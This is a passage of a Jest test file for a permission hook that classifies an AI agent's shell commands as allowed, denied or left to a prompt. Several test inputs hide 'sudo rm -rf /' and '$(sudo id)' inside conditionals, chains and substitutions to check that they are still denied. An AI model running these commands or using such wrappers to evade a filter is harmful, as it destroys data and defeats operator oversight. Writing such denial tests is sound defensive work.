		['strings /usr/lib/libfoo.so'],
		['shasum docs/index.html'],
		['sha256sum package-lock.json'],
		['xxd /tmp/claude-transient/probe.bin'],
		['paste - - /tmp/claude-transient/probe.txt'],
		['paste -sd, /tmp/a.txt']
	])('"%s" → allow', (command) => {
		expect(decisionOf(command).decision).toBe('allow');
	});

	test('comm is the answer the process-substitution refusal sends a reader to', () => {
		expect(decisionOf('comm -3 <(sort a.txt) <(sort b.txt)').decision).toBe('deny');
		expect(decisionOf('sort -u a.txt > /tmp/a; sort -u b.txt > /tmp/b; comm -3 /tmp/a /tmp/b').decision).toBe('allow');
	});
});

describe('the shell builtins set and [[ are allowed beside test and [', () => {
	test.each([['set -e'], ['set -o pipefail'], ['[[ -f /tmp/x.rc ]]'], ['[[ "$x" = "1" ]]']])('"%s" → allow', (command) => {
		expect(decisionOf(command).decision).toBe('allow');
	});

	test('an if conditional written with [[ resolves to allow', () => {
		expect(decisionOf('if [[ -f /tmp/x.rc ]]; then echo done; fi').decision).toBe('allow');
	});

	test('a denied command in the body of a [[ conditional still denies', () => {
		expect(decisionOf('if [[ -f /tmp/x.rc ]]; then sudo rm -rf /; fi').decision).toBe('deny');
	});

	test('a denied command chained after a [[ test still denies', () => {
		expect(decisionOf('[[ -f /tmp/x.rc ]] && sudo rm -rf /').decision).toBe('deny');
	});

	test('a denied command substituted inside a [[ test still denies', () => {
		expect(decisionOf('[[ -n $(sudo id) ]]').decision).toBe('deny');
	});

	test('an unclassified command in the body of a [[ conditional does not auto-allow', () => {
		expect(decisionOf('if [[ -f /tmp/x.rc ]]; then totally-unknown-binary; fi').decision).not.toBe('allow');
	});

	test('a denied command after set -e still denies', () => {
		expect(decisionOf('set -e; sudo rm -rf /').decision).toBe('deny');
	});
});

describe('tsc is not on the allow-list', () => {
	test.each([['tsc --noEmit'], ['tsc --project tsconfig.json --noEmit']])('"%s" → no-match (falls through to the prompt)', (command) => {
		expect(decisionOf(command).decision).toBe('no-match');
	});

	test('a path form is not swept in by the bare allow', () => {
		expect(decisionOf('node_modules/.bin/tsc --noEmit').decision).not.toBe('allow');
	});
});

describe('the generic rule set answers the examples of the export', () => {
	const hookEvent = (command, agentType) =>
		JSON.stringify({
			tool_name: 'Bash',
			hook_event_name: 'PreToolUse',
			permission_mode: 'default',
			tool_input: { command },
			...(agentType ? { agent_type: agentType } : {})
		});
	const decisionFor = (command, agentType) => {
		const result = runBin(hookEvent(command, agentType));
		return { exitCode: result.exitCode, stdout: result.stdout, payload: result.stdout ? JSON.parse(result.stdout) : null };
	};

	test('sudo rm -rf / → deny', () => {
		const { exitCode, payload } = decisionFor('sudo rm -rf /');
		expect(exitCode).toBe(0);
		expect(payload.hookSpecificOutput).toEqual(expect.objectContaining({ hookEventName: 'PreToolUse', permissionDecision: 'deny' }));
		expect(payload.hookSpecificOutput.permissionDecisionReason).toMatch(/sudo is not allowed/);
	});

	test('a workflow-worker running git commit -m x → deny by the worker git rule', () => {
		const { exitCode, payload } = decisionFor('git commit -m x', 'workflow-worker');
		expect(exitCode).toBe(0);
		expect(payload.hookSpecificOutput.permissionDecision).toBe('deny');
		expect(payload.hookSpecificOutput.permissionDecisionReason).toMatch(/Record no other git state/);
	});

	test('git status → allow', () => {
		const { exitCode, payload } = decisionFor('git status');
		expect(exitCode).toBe(0);
		expect(payload.hookSpecificOutput.permissionDecision).toBe('allow');
	});

	test.each([['aws s3 ls'], ['ffmpeg -i a.mp4 b.gif']])('%s → no decision: exit 0 and no output, so the permission prompt appears', (command) => {
		const { exitCode, stdout } = decisionFor(command);
		expect(exitCode).toBe(0);
		expect(stdout).toBe('');
	});

	test('a workflow-worker running make workflow-serial-gate → deny by the worker gate rule', () => {
		const { exitCode, payload } = decisionFor('make workflow-serial-gate', 'workflow-worker');
		expect(exitCode).toBe(0);
		expect(payload.hookSpecificOutput.permissionDecision).toBe('deny');
		expect(payload.hookSpecificOutput.permissionDecisionReason).toMatch(/No form of a gate goal is yours/);
	});

	test('a workflow-gate running make workflow-serial-gate → allow', () => {
		const { payload } = decisionFor('make workflow-serial-gate', 'workflow-gate');
		expect(payload.hookSpecificOutput.permissionDecision).toBe('allow');
	});
});
